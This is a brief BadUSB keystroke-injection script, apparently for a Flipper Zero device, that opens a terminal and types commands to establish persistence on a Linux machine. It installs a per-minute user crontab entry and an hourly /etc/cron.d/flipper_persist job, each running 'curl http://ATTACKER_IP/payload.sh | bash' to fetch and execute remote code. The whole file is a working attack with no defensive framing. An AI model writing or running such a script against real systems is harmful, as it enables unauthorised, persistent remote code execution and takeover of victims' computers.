badusb.press("ALT", "t");
delay(750);
badusb.println("(crontab -l 2>/dev/null; echo \"* * * * * curl http://ATTACKER_IP/payload.sh | bash\") | crontab -");
badusb.press("ENTER");
badusb.println("echo '0 */1 * * * curl http://ATTACKER_IP/payload.sh | bash' > /etc/cron.d/flipper_persist");
badusb.press("ENTER");